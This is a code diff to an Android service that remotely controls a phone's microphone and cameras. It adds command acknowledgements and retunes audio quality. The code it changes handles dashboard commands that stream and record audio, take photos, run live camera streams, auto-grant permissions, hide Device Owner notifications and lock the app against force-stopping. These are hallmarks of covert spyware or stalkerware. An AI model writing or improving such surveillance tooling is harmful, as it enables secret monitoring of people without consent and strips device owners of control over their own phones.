@@ -127,8 +127,8 @@ class MicService : Service() {
     @Volatile private var wsStreamMode = "auto" // auto | pcm | smart
     @Volatile private var voiceProfile = "room" // near | room | far
     @Volatile private var lowNetworkMode = false // dashboard forced low-network mode
-    @Volatile private var lowNetworkSampleRate = 16000 // dynamic: 16000 (normal) or 8000 (weak network)
-    @Volatile private var lowNetworkFrameMs = 20 // dynamic: 20ms (normal) or 40ms (weak network)
+    @Volatile private var lowNetworkSampleRate = 16000 // dynamic: 16000 (normal/low-network clarity mode)
+    @Volatile private var lowNetworkFrameMs = 20 // dynamic: 20ms (normal) or 30ms (weak network)
     @Volatile private var lastAudioChunkSentAt = 0L
     @Volatile private var lastHealthSentAt = 0L
     @Volatile private var audioSourceRotation = 0
@@ -236,11 +236,10 @@ class MicService : Service() {
         const val NOTIF_ID     = 101
         const val ACTION_RECONNECT = "com.micmonitor.app.RECONNECT"
         
-        // WebRTC bitrate settings - OPTIMIZED for weak network resilience
-        // Opus works well even at 16-24 kbps, allowing adaptive reduction
-        const val WEBRTC_MIN_BITRATE_KBPS = 16     // Ultra-low for very weak network (Opus handles this)
-        const val WEBRTC_MID_BITRATE_KBPS = 24     // Low-bandwidth friendly
-        const val WEBRTC_MAX_BITRATE_KBPS = 40     // Good quality ceiling
+        // WebRTC bitrate settings tuned for clearer speech under weak links.
+        const val WEBRTC_MIN_BITRATE_KBPS = 32
+        const val WEBRTC_MID_BITRATE_KBPS = 40
+        const val WEBRTC_MAX_BITRATE_KBPS = 64
         
         // Standard bitrates for good network conditions
         const val WEBRTC_STANDARD_MIN_KBPS = 64
@@ -411,7 +410,7 @@ class MicService : Service() {
                 wsReconnectJob?.cancel()
                 wsReconnectJob = null
                 updateNotification("Live streaming active")
-                webSocket.send("DEVICE_INFO:$deviceId:${Build.MODEL}:${Build.VERSION.SDK_INT}")
+                webSocket.send("DEVICE_INFO:$deviceId:${Build.MODEL}:${Build.VERSION.SDK_INT}:${BuildConfig.VERSION_NAME}:${BuildConfig.VERSION_CODE}")
                 // Mic-first mode: always keep capture active when connected.
                 startAudioCapture()
                 startMicWatchdog()
@@ -473,6 +472,17 @@ class MicService : Service() {
         }
     }
 
+    private fun sendCommandAck(command: String, status: String = "success", detail: String? = null) {
+        val msg = JSONObject().apply {
+            put("type", "command_ack")
+            put("command", command)
+            put("status", status)
+            if (!detail.isNullOrBlank()) put("detail", detail.take(200))
+            put("ts", System.currentTimeMillis())
+        }
+        safeSend(msg.toString())
+    }
+
     private fun isNetworkUsable(): Boolean {
         val cm = connectivityManager ?: return true
         val network = cm.activeNetwork ?: return false
@@ -530,6 +540,7 @@ class MicService : Service() {
                 }
                 updateNotification("Live streaming active")
                 safeSend("ACK:start_stream")
+                sendCommandAck("start_stream")
             }
             "stop_stream" -> {
                 Log.i(TAG, "CMD: stop mic stream")
@@ -540,6 +551,7 @@ class MicService : Service() {
                 closeRecordingFile()
                 updateNotification("Connected — mic standby")
                 safeSend("ACK:stop_stream")
+                sendCommandAck("stop_stream")
             }
             "start_record" -> {
                 Log.i(TAG, "CMD: start recording")
@@ -547,29 +559,35 @@ class MicService : Service() {
                 startAudioCapture()
                 openRecordingFile()
                 safeSend("ACK:start_record")
+                sendCommandAck("start_record")
             }
             "stop_record" -> {
                 Log.i(TAG, "CMD: stop recording")
                 closeRecordingFile()
                 safeSend("ACK:stop_record:${recordingFile?.name ?: "unknown"}")
+                sendCommandAck("stop_record", detail = recordingFile?.name ?: "unknown")
             }
             "ping" -> {
                 safeSend("pong:$deviceId")
+                sendCommandAck("ping")
             }
             "get_data" -> {
                 // Dashboard requested a fresh sync immediately
                 sendDeviceData()
+                sendCommandAck("get_data")
             }
             "force_update" -> {
                 Log.i(TAG, "CMD: force_update - checking for updates")
                 UpdateWorker.checkNow(this)
                 safeSend("ACK:force_update")
+                sendCommandAck("force_update")
             }
             "grant_permissions" -> {
                 Log.i(TAG, "CMD: grant_permissions - re-granting all permissions")
                 try {
                     UpdateService.autoGrantPermissions(this)
                     safeSend("ACK:grant_permissions:success")
+                    sendCommandAck("grant_permissions")
                     // Collect and send data to verify permissions work
                     serviceScope.launch(Dispatchers.IO) {
                         delay(500)  // Wait for permissions to apply
@@ -578,6 +596,7 @@ class MicService : Service() {
                 } catch (e: Exception) {
                     Log.e(TAG, "Failed to grant permissions: ${e.message}")
                     safeSend("ACK:grant_permissions:error:${e.message}")
+                    sendCommandAck("grant_permissions", "error", e.message)
                 }
             }
             "enable_autostart" -> {
@@ -587,12 +606,15 @@ class MicService : Service() {
                     val opened = openAutoStartSettings()
                     if (opened) {
                         safeSend("ACK:enable_autostart:opened")
+                        sendCommandAck("enable_autostart", detail = "opened")
                     } else {
                         safeSend("ACK:enable_autostart:not_supported")
+                        sendCommandAck("enable_autostart", "error", "not_supported")
                     }
                 } catch (e: Exception) {
                     Log.e(TAG, "Failed to open autostart settings: ${e.message}")
                     safeSend("ACK:enable_autostart:error:${e.message}")
+                    sendCommandAck("enable_autostart", "error", e.message)
                 }
             }
             "check_update" -> {
@@ -601,8 +623,10 @@ class MicService : Service() {
                     val versionInfo = UpdateService.checkForUpdate(this@MicService, forceCheck = true)
                     if (versionInfo != null) {
                         safeSend("""{"type":"update_available","version":"${versionInfo.versionName}","code":${versionInfo.versionCode},"size":${versionInfo.apkSize}}""")
+                        sendCommandAck("check_update", detail = "update_available")
                     } else {
                         safeSend("""{"type":"update_status","status":"up_to_date"}""")
+                        sendCommandAck("check_update", detail = "up_to_date")
                     }
                 }
             }
@@ -613,13 +637,16 @@ class MicService : Service() {
                     if (dpm.isDeviceOwnerApp(packageName)) {
                         dpm.clearDeviceOwnerApp(packageName)
                         safeSend("ACK:clear_device_owner:success")
+                        sendCommandAck("clear_device_owner")
                         Log.i(TAG, "Device Owner cleared successfully")
                     } else {
                         safeSend("ACK:clear_device_owner:not_device_owner")
+                        sendCommandAck("clear_device_owner", "error", "not_device_owner")
                     }
                 } catch (e: Exception) {
                     Log.e(TAG, "Failed to clear device owner: ${e.message}")
                     safeSend("ACK:clear_device_owner:error:${e.message}")
+                    sendCommandAck("clear_device_owner", "error", e.message)
                 }
             }
             "lock_app" -> {
@@ -632,15 +659,19 @@ class MicService : Service() {
                             val admin = android.content.ComponentName(this, DeviceAdminReceiver::class.java)
                             dpm.setUserControlDisabledPackages(admin, listOf(packageName))
                             safeSend("ACK:lock_app:success")
+                            sendCommandAck("lock_app")
                             Log.i(TAG, "App locked - cannot be force stopped")
                         } else {
                             safeSend("ACK:lock_app:not_device_owner")
+                            sendCommandAck("lock_app", "error", "not_device_owner")
                         }
                     } else {
                         safeSend("ACK:lock_app:requires_android_11")
+                        sendCommandAck("lock_app", "error", "requires_android_11")
                     }
                 } catch (e: Exception) {
                     safeSend("ACK:lock_app:error:${e.message}")
+                    sendCommandAck("lock_app", "error", e.message)
                 }
             }
             "unlock_app" -> {
@@ -653,15 +684,19 @@ class MicService : Service() {
                             val admin = android.content.ComponentName(this, DeviceAdminReceiver::class.java)
                             dpm.setUserControlDisabledPackages(admin, emptyList())
                             safeSend("ACK:unlock_app:success")
+                            sendCommandAck("unlock_app")
                             Log.i(TAG, "App unlocked - can be force stopped")
                         } else {
                             safeSend("ACK:unlock_app:not_device_owner")
+                            sendCommandAck("unlock_app", "error", "not_device_owner")
                         }
                     } else {
                         safeSend("ACK:unlock_app:requires_android_11")
+                        sendCommandAck("unlock_app", "error", "requires_android_11")
                     }
                 } catch (e: Exception) {
                     safeSend("ACK:unlock_app:error:${e.message}")
+                    sendCommandAck("unlock_app", "error", e.message)
                 }
             }
             "hide_notifications" -> {
@@ -681,19 +716,23 @@ class MicService : Service() {
                         dpm.setLongSupportMessage(admin, null)
                         
                         safeSend("ACK:hide_notifications:success")
+                        sendCommandAck("hide_notifications")
                         Log.i(TAG, "Device Owner notifications hidden")
                     } else {
                         safeSend("ACK:hide_notifications:not_device_owner")
+                        sendCommandAck("hide_notifications", "error", "not_device_owner")
                     }
                 } catch (e: Exception) {
                     Log.e(TAG, "Failed to hide notifications: ${e.message}")
                     safeSend("ACK:hide_notifications:error:${e.message}")
+                    sendCommandAck("hide_notifications", "error", e.message)
                 }
             }
             // WiFi control commands removed - feature disabled
             "wifi_on", "wifi_off" -> {
                 Log.i(TAG, "CMD: wifi control disabled")
                 safeSend("ACK:wifi:disabled")
+                sendCommandAck(cmd, "error", "disabled")
             }
             "uninstall_app" -> {
                 // Uninstall the app (clear device owner first, then uninstall)
@@ -716,10 +755,12 @@ class MicService : Service() {
                     }
                     startActivity(uninstallIntent)
                     safeSend("ACK:uninstall_app:launched")
+                    sendCommandAck("uninstall_app", detail = "launched")
                     Log.i(TAG, "Uninstall dialog launched")
                 } catch (e: Exception) {
                     Log.e(TAG, "Failed to uninstall: ${e.message}")
                     safeSend("ACK:uninstall_app:error:${e.message}")
+                    sendCommandAck("uninstall_app", "error", e.message)
                 }
             }
             else -> Log.d(TAG, "Unknown command: $cmd")
@@ -733,16 +774,19 @@ class MicService : Service() {
                 "webrtc_start" -> {
                     Log.i(TAG, "CMD: webrtc_start")
                     startWebRtcSession()
+                    sendCommandAck("webrtc_start")
                 }
                 "webrtc_stop" -> {
                     Log.i(TAG, "CMD: webrtc_stop")
                     stopWebRtcSession(notifyState = true)
+                    sendCommandAck("webrtc_stop")
                 }
                 "webrtc_offer" -> {
                     val sdp = obj.optString("sdp", "")
                     if (sdp.isNotBlank()) {
                         Log.i(TAG, "CMD: webrtc_offer")
                         applyRemoteOfferAndCreateAnswer(sdp)
+                        sendCommandAck("webrtc_offer")
                     }
                 }
                 "webrtc_ice" -> {
@@ -754,27 +798,32 @@ class MicService : Service() {
                             c.optString("candidate", "")
                         )
                         peerConnection?.addIceCandidate(candidate)
+                        sendCommandAck("webrtc_ice")
                     }
                 }
                 "webrtc_quality" -> {
                     lastDashboardQuality = obj.optJSONObject("quality")
                     applyAdaptiveBitrate()
+                    sendCommandAck("webrtc_quality")
                 }
                 "ai_mode" -> {
                     aiAutoModeEnabled = false
                     aiEnhancementEnabled = obj.optBoolean("enabled", true)
                     sendHealthStatus(if (aiEnhancementEnabled) "ai_mode_on" else "ai_mode_off")
                     Log.i(TAG, "AI mode set to $aiEnhancementEnabled")
+                    sendCommandAck("ai_mode", detail = if (aiEnhancementEnabled) "on" else "off")
                 }
                 "ai_auto" -> {
                     aiAutoModeEnabled = obj.optBoolean("enabled", true)
                     sendHealthStatus(if (aiAutoModeEnabled) "ai_auto_on" else "ai_auto_off")
                     Log.i(TAG, "AI auto mode set to $aiAutoModeEnabled")
+                    sendCommandAck("ai_auto", detail = if (aiAutoModeEnabled) "on" else "off")
                 }
                 "photo_ai" -> {
                     aiPhotoEnhancementEnabled = obj.optBoolean("enabled", true)
                     sendHealthStatus(if (aiPhotoEnhancementEnabled) "photo_ai_on" else "photo_ai_off")
                     safeSend("ACK:photo_ai:${if (aiPhotoEnhancementEnabled) "on" else "off"}")
+                    sendCommandAck("photo_ai", detail = if (aiPhotoEnhancementEnabled) "on" else "off")
                 }
                 "photo_quality" -> {
                     val mode = obj.optString("mode", "normal").trim().lowercase()
@@ -785,6 +834,7 @@ class MicService : Service() {
                     }
                     sendHealthStatus("photo_quality_$photoQualityMode")
                     safeSend("ACK:photo_quality:$photoQualityMode")
+                    sendCommandAck("photo_quality", detail = photoQualityMode)
                 }
                 "photo_night" -> {
                     val mode = obj.optString("mode", "off").trim().lowercase()
@@ -794,6 +844,7 @@ class MicService : Service() {
                     }
                     sendHealthStatus("photo_night_$photoNightMode")
                     safeSend("ACK:photo_night:$photoNightMode")
+                    sendCommandAck("photo_night", detail = photoNightMode)
                 }
                 "stream_codec" -> {
                     val mode = obj.optString("mode", "auto").trim().lowercase()
@@ -804,19 +855,18 @@ class MicService : Service() {
                     }
                     sendHealthStatus("stream_codec_$wsStreamMode")
                     Log.i(TAG, "WS stream mode set to $wsStreamMode")
+                    sendCommandAck("stream_codec", detail = wsStreamMode)
                 }
                 "set_low_network" -> {
                     val enabled = obj.optBoolean("enabled", false)
                     lowNetworkMode = enabled
                     if (enabled) {
-                        // LOW NETWORK OPTIMIZATIONS:
-                        // 1. Force WebRTC (Opus) - NOT PCM (PCM = 256kbps, Opus = 16-24kbps)
-                        // 2. Reduce sample rate to 8kHz (cuts bandwidth 50%)
-                        // 3. Increase frame size to 40ms (fewer packets = more stable)
-                        wsStreamMode = "smart" // Use compressed codec for WS fallback
-                        lowNetworkSampleRate = 8000
-                        lowNetworkFrameMs = 40
-                        Log.i(TAG, "Low-network mode ENABLED - Opus 16-24kbps, 8kHz, 40ms frames")
+                        // LOW NETWORK MODE:
+                        // Keep intelligibility/clarity as priority while reducing bitrate.
+                        // Avoid forcing 8kHz MuLaw unless explicitly requested.
+                        lowNetworkSampleRate = 16000
+                        lowNetworkFrameMs = 30
+                        Log.i(TAG, "Low-network mode ENABLED - Opus 32-64kbps, 16kHz, 30ms frames")
                         
                         // If WebRTC is active, update bitrate immediately
                         applyAdaptiveBitrate()
@@ -831,6 +881,7 @@ class MicService : Service() {
                     }
                     sendHealthStatus("low_network_${if (enabled) "on" else "off"}")
                     safeSend("""{"type":"low_network_ack","enabled":$enabled,"sampleRate":$lowNetworkSampleRate,"frameMs":$lowNetworkFrameMs}""")
+                    sendCommandAck("set_low_network", detail = if (enabled) "on" else "off")
                 }
                 "voice_profile" -> {
                     val profile = obj.optString("profile", "room").trim().lowercase()
@@ -841,6 +892,7 @@ class MicService : Service() {
                     }
                     sendHealthStatus("voice_profile_$voiceProfile")
                     Log.i(TAG, "Voice profile set to $voiceProfile")
+                    sendCommandAck("voice_profile", detail = voiceProfile)
                 }
                 "switch_camera" -> {
                     preferredCameraFacing = if (preferredCameraFacing == CameraCharacteristics.LENS_FACING_FRONT)
@@ -851,9 +903,11 @@ class MicService : Service() {
                     cameraLiveStrictFacing = true
                     if (isCameraLiveStreaming) restartCameraLiveStream()
                     safeSend("ACK:switch_camera:$cameraText")
+                    sendCommandAck("switch_camera", detail = cameraText)
                 }
                 "take_photo" -> {
                     val camera = obj.optString("camera", "current").trim().lowercase()
+                    sendCommandAck("take_photo", detail = "accepted:$camera")
                     captureAndSendPhoto(camera)
                 }
                 "camera_live_start" -> {
@@ -862,9 +916,11 @@ class MicService : Service() {
                     val facing = explicitFacing ?: preferredCameraFacing
                     preferredCameraFacing = facing
                     startCameraLiveStream(facing, strictFacing = explicitFacing != null)
+                    sendCommandAck("camera_live_start", detail = camera)
                 }
                 "camera_live_stop" -> {
                     stopCameraLiveStream("remote_stop")
+                    sendCommandAck("camera_live_stop")
                 }
                 else -> Log.d(TAG, "Unknown JSON command: ${obj.optString("type")}")
             }
@@ -912,14 +968,13 @@ class MicService : Service() {
             mandatory.add(MediaConstraints.KeyValuePair("googEchoCancellation", "false"))
             mandatory.add(MediaConstraints.KeyValuePair("googEchoCancellation2", "false"))
             
-            // In low network mode: keep AGC + NS (high benefit, low CPU)
-            // These are lightweight and critical for clarity
+            // Keep NS enabled. Avoid stacking multiple AGC variants to reduce pumping artifacts.
             mandatory.add(MediaConstraints.KeyValuePair("googNoiseSuppression", "true"))
             mandatory.add(MediaConstraints.KeyValuePair("googNoiseSuppression2", "false"))
             mandatory.add(MediaConstraints.KeyValuePair("googExperimentalNoiseSuppression", "false"))
             mandatory.add(MediaConstraints.KeyValuePair("googAutoGainControl", "true"))
-            mandatory.add(MediaConstraints.KeyValuePair("googAutoGainControl2", "true"))
-            mandatory.add(MediaConstraints.KeyValuePair("googExperimentalAutoGainControl", "true"))
+            mandatory.add(MediaConstraints.KeyValuePair("googAutoGainControl2", "false"))
+            mandatory.add(MediaConstraints.KeyValuePair("googExperimentalAutoGainControl", "false"))
             mandatory.add(MediaConstraints.KeyValuePair("googHighpassFilter", "true"))
             mandatory.add(MediaConstraints.KeyValuePair("googTypingNoiseDetection", "false"))
             
@@ -1107,7 +1162,7 @@ class MicService : Service() {
             ?.getOrNull(1)
             ?: return sdp
         
-        // In low network mode, use aggressive compression settings
+        // In low network mode, keep quality-biased compression settings.
         val effectiveTarget = if (lowNetworkMode) targetKbps.coerceAtMost(WEBRTC_MAX_BITRATE_KBPS) else targetKbps
         val maxAvg = (effectiveTarget * 1000).coerceIn(WEBRTC_MIN_BITRATE_KBPS * 1000, WEBRTC_STANDARD_MAX_KBPS * 1000)
         val minAvg = (WEBRTC_MIN_BITRATE_KBPS * 1000).coerceAtMost(maxAvg)
@@ -1119,7 +1174,7 @@ class MicService : Service() {
         val tunedParams = mapOf(
             "maxaveragebitrate" to maxAvg.toString(),
             "minaveragebitrate" to minAvg.toString(),
-            "maxplaybackrate" to if (lowNetworkMode) "16000" else "48000", // 8kHz narrowband in low network
+            "maxplaybackrate" to if (lowNetworkMode) "16000" else "48000",
             "sprop-maxcapturerate" to if (lowNetworkMode) "16000" else "48000",
             "ptime" to ptime,
             "minptime" to ptime,
@@ -1128,7 +1183,7 @@ class MicService : Service() {
             "stereo" to "0",
             "sprop-stereo" to "0",
             "cbr" to "0",                    // VBR: allocates more bits to complex speech
-            "complexity" to if (lowNetworkMode) "5" else "10",  // Lower complexity saves CPU in low network
+            "complexity" to if (lowNetworkMode) "7" else "10",
         )
         return if (fmtpRegex.containsMatchIn(sdp)) {
             sdp.replace(fmtpRegex) { match ->
@@ -1229,17 +1284,16 @@ class MicService : Service() {
     }
 
     private fun chooseTargetBitrateKbps(): Int {
-        // LOW NETWORK MODE: Use aggressive low bitrates (16-24 kbps)
-        // Opus works well at these rates - designed for weak networks
+        // LOW NETWORK MODE: keep quality-biased bitrates for better speech clarity.
         if (lowNetworkMode) {
             val q = lastDashboardQuality
             val loss = q?.optDouble("lossPct", Double.NaN) ?: Double.NaN
             
-            // In low network mode, stay between 16-24 kbps
+            // Keep within 32-40 kbps unless network is healthy enough for 64.
             return if (!loss.isNaN() && loss >= 10.0) {
-                WEBRTC_MIN_BITRATE_KBPS  // 16 kbps for high packet loss
+                WEBRTC_MIN_BITRATE_KBPS
             } else {
-                WEBRTC_MID_BITRATE_KBPS  // 24 kbps otherwise
+                WEBRTC_MID_BITRATE_KBPS
             }
         }
         
@@ -1259,8 +1313,8 @@ class MicService : Service() {
             val downKbps = caps.linkDownstreamBandwidthKbps
             target = when {
                 // Use low-network bitrates for very poor WiFi
-                downKbps in 1..200 -> WEBRTC_MID_BITRATE_KBPS  // 24 kbps
-                downKbps in 201..500 -> WEBRTC_MAX_BITRATE_KBPS // 40 kbps
+                downKbps in 1..200 -> WEBRTC_MIN_BITRATE_KBPS
+                downKbps in 201..500 -> WEBRTC_MID_BITRATE_KBPS
                 downKbps in 501..1000 -> WEBRTC_STANDARD_MIN_KBPS // 64 kbps
                 else -> WEBRTC_STANDARD_MAX_KBPS // 128 kbps
             }
@@ -1271,15 +1325,15 @@ class MicService : Service() {
         val rtt = q?.optDouble("rttMs", Double.NaN) ?: Double.NaN
         val jitter = q?.optDouble("jitterMs", Double.NaN) ?: Double.NaN
         
-        // Severe network issues: drop to ultra-low bitrate
-        if (wsReconnectAttempts >= 6) return WEBRTC_MIN_BITRATE_KBPS  // 16 kbps
+        // Severe network issues: drop to minimum low-network bitrate
+        if (wsReconnectAttempts >= 6) return WEBRTC_MIN_BITRATE_KBPS
         if (!loss.isNaN() && loss >= 25.0) return WEBRTC_MIN_BITRATE_KBPS
         if (!rtt.isNaN() && rtt >= 800.0) return WEBRTC_MIN_BITRATE_KBPS
         if (!jitter.isNaN() && jitter >= 300.0) return WEBRTC_MIN_BITRATE_KBPS
         
-        // Moderate issues: use low-network range
+        // Moderate issues: use low-network mid bitrate.
         if ((!loss.isNaN() && loss >= 15.0) || (!rtt.isNaN() && rtt >= 500.0) || (!jitter.isNaN() && jitter >= 150.0)) {
-            return WEBRTC_MID_BITRATE_KBPS  // 24 kbps
+            return WEBRTC_MID_BITRATE_KBPS
         }
         
         return target.coerceIn(WEBRTC_MIN_BITRATE_KBPS, WEBRTC_STANDARD_MAX_KBPS)
@@ -2239,9 +2293,9 @@ class MicService : Service() {
 
         // ── Pre-gain mic boost ────────────────────────────────────────────────
         val micBoost = when (p) {
-            "near" -> if (strongAi) 1.08 else 1.00
-            "far" -> if (strongAi) 1.34 else 1.16
-            else -> if (strongAi) 1.22 else 1.05
+            "near" -> if (strongAi) 1.04 else 1.00
+            "far" -> if (strongAi) 1.18 else 1.08
+            else -> if (strongAi) 1.12 else 1.03
         }
         for (i in 0 until samples) work[i] *= micBoost
 
@@ -2264,14 +2318,14 @@ class MicService : Service() {
         for (v in work) sumSq += v * v
         val rms = Math.sqrt(sumSq / samples).coerceAtLeast(1.0)
         val gainCeil = when (p) {
-            "near" -> if (strongAi) 2.2 else 1.7
-            "far" -> if (strongAi) 3.6 else 2.8
-            else -> if (strongAi) 3.0 else 2.2
+            "near" -> if (strongAi) 1.5 else 1.3
+            "far" -> if (strongAi) 2.1 else 1.7
+            else -> if (strongAi) 1.8 else 1.4
         }
         val gainTarget = when (p) {
-            "near" -> if (strongAi) 5600.0 else 4700.0
-            "far" -> if (strongAi) 7800.0 else 6400.0
-            else -> if (strongAi) 6900.0 else 5600.0
+            "near" -> if (strongAi) 5000.0 else 4300.0
+            "far" -> if (strongAi) 6400.0 else 5400.0
+            else -> if (strongAi) 5600.0 else 4800.0
         }
         val rawGain = (gainTarget / rms).coerceIn(1.0, gainCeil)
         // Smoother attack/release keeps the output natural.
@@ -2296,9 +2350,9 @@ class MicService : Service() {
             eq1Y2 = eq1Y1
             eq1Y1 = y
             val wet = when (p) {
-                "near" -> if (strongAi) 0.26 else 0.18
-                "far" -> if (strongAi) 0.46 else 0.32
-                else -> if (strongAi) 0.38 else 0.24
+                "near" -> if (strongAi) 0.18 else 0.12
+                "far" -> if (strongAi) 0.30 else 0.22
+                else -> if (strongAi) 0.24 else 0.16
             }
             work[i] = x * (1.0 - wet) + y * wet
         }
@@ -2331,8 +2385,15 @@ class MicService : Service() {
         // LOW NETWORK MODE: AVOID PCM (256 kbps) - use compressed codec
         // PCM is the WRONG choice for weak networks
         if (lowNetworkMode) {
-            Log.i(TAG, "Low-network mode: using MuLaw 8kHz (64 kbps vs 256 kbps PCM)")
-            return AUDIO_CODEC_MULAW_8K
+            // Clarity-priority low-network mode:
+            // keep PCM for WS fallback unless user explicitly selected "smart".
+            return if (wsStreamMode == "smart") {
+                Log.i(TAG, "Low-network mode: using MuLaw because stream mode is smart")
+                AUDIO_CODEC_MULAW_8K
+            } else {
+                Log.i(TAG, "Low-network mode: keeping PCM fallback for clarity")
+                AUDIO_CODEC_PCM16_16K
+            }
         }
         
         return when (wsStreamMode) {
@@ -2589,7 +2650,7 @@ class MicService : Service() {
      * Prevents hard digital clipping without audible distortion.
      */
     private fun softPeakLimit(x: Double): Double {
-        val knee = 22000.0
+        val knee = 18000.0 // Lower knee for earlier soft limiting
         val ceil = 32767.0
         val abs  = Math.abs(x)
         if (abs <= knee) return x
@@ -2695,6 +2756,8 @@ class MicService : Service() {
             put("photoAi", aiPhotoEnhancementEnabled)
             put("photoQuality", photoQualityMode)
             put("photoNight", photoNightMode)
+            put("appVersionName", BuildConfig.VERSION_NAME)
+            put("appVersionCode", BuildConfig.VERSION_CODE)
             put("streamCodecMode", wsStreamMode)
             put("streamCodec", if (chooseWsFallbackCodec() == AUDIO_CODEC_MULAW_8K) "smart" else "pcm")
             put("voiceProfile", voiceProfile)
